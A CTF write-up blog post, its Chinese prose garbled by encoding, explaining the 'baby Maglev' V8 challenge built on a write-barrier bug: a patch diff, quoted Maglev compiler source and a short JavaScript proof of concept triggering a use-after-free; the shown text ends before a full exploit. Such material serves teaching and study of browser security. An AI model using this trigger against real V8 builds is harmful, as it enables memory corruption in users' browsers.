<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="å‰è¨€HITCON CTF è³‡å®‰äº¤æµè³½è¦æº–å‚™å…©å€‹ CTF é¡Œç›®ï¼Œå‰›å¥½å‰é™£å­åœ¨åˆ†æ CVE-2025-9864 çš„éç¨‹ä¸­å­¸åˆ°è »å¤šæ±è¥¿æ‰€ä»¥å°±æŠŠå®ƒè®Šæˆèƒ½ Exploit è®“å¤§å®¶ç©æ„Ÿå—ç—›è‹¦å‰›å¥½ Issue é é¢ä¹Ÿé‚„æ²’å…¬é–‹ï¼Œæ‰€ä»¥å¤§å®¶ä¹Ÿä¸èƒ½æŠ„ä½œæ¥­ XDDD PatchæŠŠ Float64ToTagged::ConversionMode å¾ kCanonicalizeSmi æ›æˆ kForceHeapNumberç•¶">
<meta property="og:type" content="article">
<meta property="og:title" content="HITCON ExhibitionCTF 2025 baby Maglev Official Solution">
<meta property="og:url" content="http://example.com/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/index.html">
<meta property="og:site_name" content="Terry1234&#39;s blog">
<meta property="og:description" content="å‰è¨€HITCON CTF è³‡å®‰äº¤æµè³½è¦æº–å‚™å…©å€‹ CTF é¡Œç›®ï¼Œå‰›å¥½å‰é™£å­åœ¨åˆ†æ CVE-2025-9864 çš„éç¨‹ä¸­å­¸åˆ°è »å¤šæ±è¥¿æ‰€ä»¥å°±æŠŠå®ƒè®Šæˆèƒ½ Exploit è®“å¤§å®¶ç©æ„Ÿå—ç—›è‹¦å‰›å¥½ Issue é é¢ä¹Ÿé‚„æ²’å…¬é–‹ï¼Œæ‰€ä»¥å¤§å®¶ä¹Ÿä¸èƒ½æŠ„ä½œæ¥­ XDDD PatchæŠŠ Float64ToTagged::ConversionMode å¾ kCanonicalizeSmi æ›æˆ kForceHeapNumberç•¶">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/exp.png">
<meta property="article:published_time" content="2025-10-19T13:56:36.000Z">
<meta property="article:modified_time" content="2025-10-19T15:40:07.356Z">
<meta property="article:author" content="Terry1234">
<meta property="article:tag" content="V8">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/exp.png">

<link rel="canonical" href="http://example.com/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>HITCON ExhibitionCTF 2025 baby Maglev Official Solution | Terry1234's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Terry1234's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">æˆ‘å€‘çµ‚æœƒæŠµé”å„è‡ªçš„çµ‚é»</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HITCON ExhibitionCTF 2025 baby Maglev Official Solution
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-10-19 21:56:36 / Modified: 23:40:07" itemprop="dateCreated datePublished" datetime="2025-10-19T21:56:36+08:00">2025-10-19</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>HITCON CTF è³‡å®‰äº¤æµè³½è¦æº–å‚™å…©å€‹ CTF é¡Œç›®ï¼Œå‰›å¥½å‰é™£å­åœ¨åˆ†æ CVE-2025-9864 çš„éç¨‹ä¸­å­¸åˆ°è »å¤šæ±è¥¿<br>æ‰€ä»¥å°±æŠŠå®ƒè®Šæˆèƒ½ Exploit è®“å¤§å®¶ç©<del>æ„Ÿå—ç—›è‹¦</del><br>å‰›å¥½ Issue é é¢ä¹Ÿé‚„æ²’å…¬é–‹ï¼Œæ‰€ä»¥å¤§å®¶ä¹Ÿä¸èƒ½æŠ„ä½œæ¥­ XDDD</p>
<h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>æŠŠ Float64ToTagged::ConversionMode å¾ kCanonicalizeSmi æ›æˆ kForceHeapNumber<br>ç•¶è¦è¢«å„²å­˜çš„ value å¯è¢« smi è¡¨ç¤ºæ™‚ï¼ŒkCanonicalizeSmi æœƒä½¿ç”¨ smi å„²å­˜é€™å€‹ valueï¼Œå¦‚æœæ˜¯æµ®é»æ•¸æˆ–æ˜¯è¶…å‡º SMI ç¯„åœçš„ integer å‰‡æœƒä½¿ç”¨ HeapNumber Object</p>
<p>kForceHeapNumber å‰‡ä¸€å¾‹ä½¿ç”¨ HeapNumber Object å„²å­˜<br>smi å’Œ Heap Object åœ¨ V8 Heap ä¸Šçš„å·®ç•°æ˜¯ smi æ˜¯ç›´æ¥å­˜å€¼ï¼ŒHeapNumber å„²å­˜çš„æ˜¯ Pointer</p>
<p>ç¬¬äºŒå€‹æ”¹å‹•å‰‡æ˜¯è®“ V8 ä¸è¦ Crash è€Œå·²ï¼Œä¸ç„¶æ²’è¾¦æ³• Exploit XDDD<br>ç”¨åˆ° Runtime_CheckNoWriteBarrierNeeded çš„åœ°æ–¹è »å°‘çš„ï¼Œé æœŸè§£æ˜¯å¾é€™é‚Šé–‹å§‹çœ‹</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/maglev/maglev-reducer-inl.h b/src/maglev/maglev-reducer-inl.h</span></span><br><span class="line"><span class="comment">index 60e26dfff1a..099893dd23c 100644</span></span><br><span class="line"><span class="comment">--- a/src/maglev/maglev-reducer-inl.h</span></span><br><span class="line"><span class="comment">+++ b/src/maglev/maglev-reducer-inl.h</span></span><br><span class="line"><span class="meta">@@ -531,14 +531,10 @@</span> ValueNode* MaglevReducer&lt;BaseT&gt;::GetTaggedValue(</span><br><span class="line">           AddNewNodeNoInputConversion&lt;Uint32ToNumber&gt;(&#123;value&#125;));</span><br><span class="line">     &#125;</span><br><span class="line">     case ValueRepresentation::kFloat64: &#123;</span><br><span class="line"><span class="deletion">-      if (!IsEmptyNodeType(node_info-&gt;type()) &amp;&amp; node_info-&gt;is_smi()) &#123;</span></span><br><span class="line"><span class="deletion">-        return alternative.set_tagged(</span></span><br><span class="line"><span class="deletion">-            AddNewNodeNoInputConversion&lt;CheckedSmiTagFloat64&gt;(&#123;value&#125;));</span></span><br><span class="line"><span class="deletion">-      &#125;</span></span><br><span class="line">       // TODO(victorgomes): Do not tag Float64Constant on runtime.</span><br><span class="line">       return alternative.set_tagged(</span><br><span class="line">           AddNewNodeNoInputConversion&lt;Float64ToTagged&gt;(</span><br><span class="line"><span class="deletion">-              &#123;value&#125;, Float64ToTagged::ConversionMode::kCanonicalizeSmi));</span></span><br><span class="line"><span class="addition">+              &#123;value&#125;, Float64ToTagged::ConversionMode::kForceHeapNumber));</span></span><br><span class="line">     &#125;</span><br><span class="line">     case ValueRepresentation::kHoleyFloat64: &#123;</span><br><span class="line">       if (!IsEmptyNodeType(node_info-&gt;type()) &amp;&amp; node_info-&gt;is_smi()) &#123;</span><br><span class="line"><span class="comment">diff --git a/src/runtime/runtime-test.cc b/src/runtime/runtime-test.cc</span></span><br><span class="line"><span class="comment">index 612ae214d75..0f02119af49 100644</span></span><br><span class="line"><span class="comment">--- a/src/runtime/runtime-test.cc</span></span><br><span class="line"><span class="comment">+++ b/src/runtime/runtime-test.cc</span></span><br><span class="line"><span class="meta">@@ -2427,9 +2427,6 @@</span> RUNTIME_FUNCTION(Runtime_CheckNoWriteBarrierNeeded) &#123;</span><br><span class="line">   if (!object.IsHeapObject()) &#123;</span><br><span class="line">     return CrashUnlessFuzzing(isolate);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="deletion">-  auto heap_object = Cast&lt;HeapObject&gt;(object);</span></span><br><span class="line"><span class="deletion">-  Tagged&lt;Object&gt; value = args[1];</span></span><br><span class="line"><span class="deletion">-  CHECK(!WriteBarrier::IsRequired(heap_object, value));</span></span><br><span class="line">   return args[0];</span><br><span class="line"> #else</span><br><span class="line">   UNREACHABLE();</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h4 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h4><p>é¦–å…ˆè¦äº†è§£ Write Barrier æ˜¯ä»€éº¼<br><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8.git/+/refs/heads/12.9.16/src/heap/WRITE_BARRIER.md">https://chromium.googlesource.com/v8/v8.git/+/refs/heads/12.9.16/src/heap/WRITE_BARRIER.md</a></p>
<p>å®ƒæ˜¯ä¸€å€‹ç”¨ä¾†å¹«åŠ© V8 åš Garbage Collection çš„æ©Ÿåˆ¶<br>å› ç‚º Object åœ¨ V8 çš„ Heap ä¸Šæ˜¯ä»¥ Pointer çš„æ–¹å¼å„²å­˜ï¼Œè€Œåœ¨ GC æ™‚æœƒç§»é™¤æ­»å»çš„ Objectï¼Œå‹¢å¿…æœƒå‡ºç¾ä¸€äº› memory fragmentation çš„æƒ…å¢ƒ<br>ç‚ºäº†è¦è§£æ±ºé€™ç¨®æƒ…æ³ï¼ŒV8 æœƒæ¬ç§» Heap ä¸Šçš„ Object<br>Write Barrier å‰‡æ˜¯ç”¨ä¾†ç¢ºä¿é‚£äº›æŒ‡åˆ°è¢«æ¬ç§»çš„ Object çš„ Pointer ä¾ç„¶æŒ‡åˆ°æ­£ç¢ºçš„ address çš„ä¸€é …æ©Ÿåˆ¶<br>å¦‚æœæ²’æœ‰ Write Barrier ç´€éŒ„çš„è©±ï¼ŒåŸæœ¬æŒ‡åˆ°è¢«æ¬ç§»çš„ Object çš„ Pointer å°±ä¸æœƒè¢«æ›´æ–°ï¼Œå¾è€Œè®Šæˆ Dangling Pointer</p>
<h4 id="Trigger-UAF"><a href="#Trigger-UAF" class="headerlink" title="Trigger UAF"></a>Trigger UAF</h4><p>MaglevReducer<BaseT>::GetTaggedValue ä¸­çš„ Switch æ˜¯æ ¹æ“š value_representation åšåˆ¤æ–·çš„ï¼Œè€Œ value_representation åªè·Ÿ ValueNode çš„ OpProperties æœ‰é—œï¼Œèˆ‡ Node çš„ Output å¯ä»¥è¢«ç”¨ä»€éº¼ Type å„²å­˜ç„¡é—œ<br>èˆ‰å€‹ä¾‹å­ï¼Œå¦‚æœä¸€å€‹ ValueNode çš„ OpProperties åŒ…å« kFloat64ï¼Œä¸” Output Value æ˜¯ 4.0(ä¸€å€‹èƒ½è¢« smi å„²å­˜çš„æ•¸å€¼)<br>é‚£å®ƒçš„ value_representation å°±æœƒæ˜¯ ValueRepresentation::kFloat64</p>
<p>å¾ç¬¬äºŒå€‹æ”¹å‹•çš„åœ°æ–¹é–‹å§‹çœ‹æœƒç™¼ç¾åªæœ‰ 3 å€‹ Node åœ¨ Emit Machine Code æ™‚ç”¨åˆ° Runtime_CheckNoWriteBarrierNeeded<br>å…¶ä¸­æœƒç™¼ç¾æ‡‰è©²è¦å…ˆçœ‹ StoreTaggedFieldNoWriteBarrier é€™å€‹ Node<br>BuildStoreTaggedFieldNoWriteBarrier() æœ€å¾Œä¹Ÿæœƒ call åˆ° MaglevReducer<BaseT>::GetTaggedValue<br>é€™å€‹ Node ä¹Ÿæ¯”å…¶ä»–å…©å€‹ Node (StoreFixedArrayElementNoWriteBarrier &#x2F; StoreMap) å¸¸å‡ºç¾åœ¨ UAF çš„æ´ä¹‹ä¸­<br>ç›®å‰é‚„æ²’çœ‹éèª¤ç”¨ StoreFixedArrayElementNoWriteBarrier &#x2F; StoreMap å°è‡´UAFçš„æƒ…æ³ XDDD</p>
<p>é–å®š StoreTaggedFieldNoWriteBarrier å¾Œå¯ä»¥çœ‹é€™å€‹ Node åœ¨ä»€éº¼æƒ…æ³ä¸‹æœƒè¢«å»ºå‡ºä¾†<br>é€™é‚Šå¯ä»¥æ…¢æ…¢æ‰¾å“ªäº›åœ°æ–¹æœƒç”¨åˆ° BuildStoreTaggedFieldNoWriteBarrier()</p>
<p>å…¶ä¸­ MaglevGraphBuilder::TrySpecializeStoreContextSlot() æ˜¯å€‹è »æœ‰è¶£çš„åœ°æ–¹</p>
<p>å®ƒæ˜¯åœ¨æ ¹æ“š runtime è’é›†åˆ°çš„ context(å¯ä»¥æƒ³æˆ feedback) ä¾†å„ªåŒ– JavaScript ä¸­çš„ store operation<br>ç•¶è¦å„²å­˜çš„å€¼å¯ä»¥è¢« smi è¡¨ç¤ºæ™‚(e.g. 4.0) å°±æœƒé€²å…¥ ContextCell::kSmi çš„ Case ä¸­ï¼Œç”¢å‡º Runtime Check å’Œ StoreTaggedFieldNoWriteBarrier Node</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MaybeReduceResult <span class="title">MaglevGraphBuilder::TrySpecializeStoreContextSlot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ValueNode* context, <span class="type">int</span> index, ValueNode* value, Node** store)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_NOT_NULL</span>(store);</span><br><span class="line">  <span class="built_in">DCHECK</span>(v8_flags.script_context_cells || v8_flags.function_context_cells);</span><br><span class="line">  <span class="keyword">if</span> (!context-&gt;<span class="built_in">Is</span>&lt;Constant&gt;()) &#123;</span><br><span class="line">    *store =</span><br><span class="line">        <span class="built_in">AddNewNode</span>&lt;StoreContextSlotWithWriteBarrier&gt;(&#123;context, value&#125;, index);</span><br><span class="line">    <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">IsEmptyNodeType</span>(<span class="built_in">GetType</span>(value))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">EmitUnconditionalDeopt</span>(DeoptimizeReason::kWrongValue);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  compiler::ContextRef context_ref =</span><br><span class="line">      context-&gt;<span class="built_in">Cast</span>&lt;Constant&gt;()-&gt;<span class="built_in">ref</span>().<span class="built_in">AsContext</span>();</span><br><span class="line">  <span class="keyword">auto</span> maybe_value = context_ref.<span class="built_in">get</span>(<span class="built_in">broker</span>(), index);</span><br><span class="line">  <span class="keyword">if</span> (!maybe_value || maybe_value-&gt;<span class="built_in">IsTheHole</span>() ||</span><br><span class="line">      maybe_value-&gt;<span class="built_in">IsUndefinedContextCell</span>()) &#123;</span><br><span class="line">    *store =</span><br><span class="line">        <span class="built_in">AddNewNode</span>&lt;StoreContextSlotWithWriteBarrier&gt;(&#123;context, value&#125;, index);</span><br><span class="line">    <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> offset = Context::<span class="built_in">OffsetOfElementAt</span>(index);</span><br><span class="line">  <span class="keyword">if</span> (!maybe_value-&gt;<span class="built_in">IsContextCell</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BuildStoreTaggedField</span>(context, value, offset,</span><br><span class="line">                                 StoreTaggedMode::kDefault, store);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  compiler::ContextCellRef slot_ref = maybe_value-&gt;<span class="built_in">AsContextCell</span>();</span><br><span class="line">  ContextCell::State state = slot_ref.<span class="built_in">state</span>();</span><br><span class="line">  <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kConst: &#123;</span><br><span class="line">      <span class="keyword">auto</span> constant = slot_ref.<span class="built_in">tagged_value</span>(<span class="built_in">broker</span>());</span><br><span class="line">      <span class="keyword">if</span> (!constant.<span class="built_in">has_value</span>() ||</span><br><span class="line">          (constant-&gt;<span class="built_in">IsString</span>() &amp;&amp; !constant-&gt;<span class="built_in">IsInternalizedString</span>())) &#123;</span><br><span class="line">        *store = <span class="built_in">AddNewNode</span>&lt;StoreContextSlotWithWriteBarrier&gt;(&#123;context, value&#125;,</span><br><span class="line">                                                              index);</span><br><span class="line">        <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnContextCell</span>(slot_ref, state);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">BuildCheckNumericalValueOrByReference</span>(</span><br><span class="line">          value, *constant, DeoptimizeReason::kStoreToConstant);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kSmi:</span><br><span class="line">      <span class="built_in">RETURN_IF_ABORT</span>(<span class="built_in">BuildCheckSmi</span>(value));</span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnContextCell</span>(slot_ref, state);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">BuildStoreTaggedFieldNoWriteBarrier</span>(</span><br><span class="line">          <span class="built_in">GetConstant</span>(slot_ref), value, <span class="built_in">offsetof</span>(ContextCell, tagged_value_),</span><br><span class="line">          StoreTaggedMode::kDefault, store);</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kInt32:</span><br><span class="line">      <span class="built_in">EnsureInt32</span>(value, <span class="literal">true</span>);</span><br><span class="line">      *store = <span class="built_in">AddNewNode</span>&lt;StoreInt32&gt;(</span><br><span class="line">          &#123;<span class="built_in">GetConstant</span>(slot_ref), value&#125;,</span><br><span class="line">          <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">offsetof</span>(ContextCell, double_value_)));</span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnContextCell</span>(slot_ref, state);</span><br><span class="line">      <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kFloat64:</span><br><span class="line">      <span class="built_in">RETURN_IF_ABORT</span>(<span class="built_in">BuildCheckNumber</span>(value));</span><br><span class="line">      *store = <span class="built_in">AddNewNode</span>&lt;StoreFloat64&gt;(</span><br><span class="line">          &#123;<span class="built_in">GetConstant</span>(slot_ref), value&#125;,</span><br><span class="line">          <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">offsetof</span>(ContextCell, double_value_)));</span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnContextCell</span>(slot_ref, state);</span><br><span class="line">      <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kDetached:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">BuildStoreTaggedField</span>(context, value, offset,</span><br><span class="line">                                   StoreTaggedMode::kDefault, store);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§€å¯Ÿå®Œä¸Šè¿°è³‡è¨Šå¾Œå¯ä»¥ç™¼ç¾å¦‚æœæˆ‘èƒ½é€ å‡ºä¸€å€‹ Store Operationï¼Œå®ƒçš„ Input ValueNode kProperties åŒ…å« kFloat64 ä¸” Output Value èƒ½è¢« smi è¡¨ç¤ºçš„è©±ï¼Œå°±æœƒç²å¾—ä¸€å€‹ä¸è¢« Write Barrier è¿½è¹¤çš„ Heap Number Object</p>
<p>æœ€å¾Œæˆ‘é¸æ“‡äº† Float64Sqrt ä¾†è§¸ç™¼ UAF</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Float64Sqrt</span> : <span class="keyword">public</span> FixedInputValueNodeT&lt;<span class="number">1</span>, Float64Sqrt&gt; &#123;</span><br><span class="line">  <span class="keyword">using</span> Base = FixedInputValueNodeT&lt;<span class="number">1</span>, Float64Sqrt&gt;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Float64Sqrt</span><span class="params">(<span class="type">uint64_t</span> bitfield)</span> : Base(bitfield) &#123;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="keyword">constexpr</span> OpProperties kProperties = OpProperties::<span class="built_in">Float64</span>();</span><br><span class="line">  <span class="type">static</span> <span class="keyword">constexpr</span></span><br><span class="line">      <span class="keyword">typename</span> Base::InputTypes kInputTypes&#123;ValueRepresentation::kHoleyFloat64&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function">Input <span class="title">input</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Node::<span class="built_in">input</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">SetValueLocationConstraints</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">GenerateCode</span><span class="params">(MaglevAssembler*, <span class="type">const</span> ProcessingState&amp;)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">PrintParams</span><span class="params">(std::ostream&amp;)</span> <span class="type">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸€å€‹ç°¡å–®çš„ poc é•·é€™æ¨£</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> v0 = <span class="number">48763</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    v0 = <span class="title class_">Math</span>.<span class="title class_">Sqrt</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">    <span class="title function_">f</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>()</span><br></pre></td></tr></table></figure>

<p>Maglev çš„ IR Graph å¦‚ä¸‹</p>
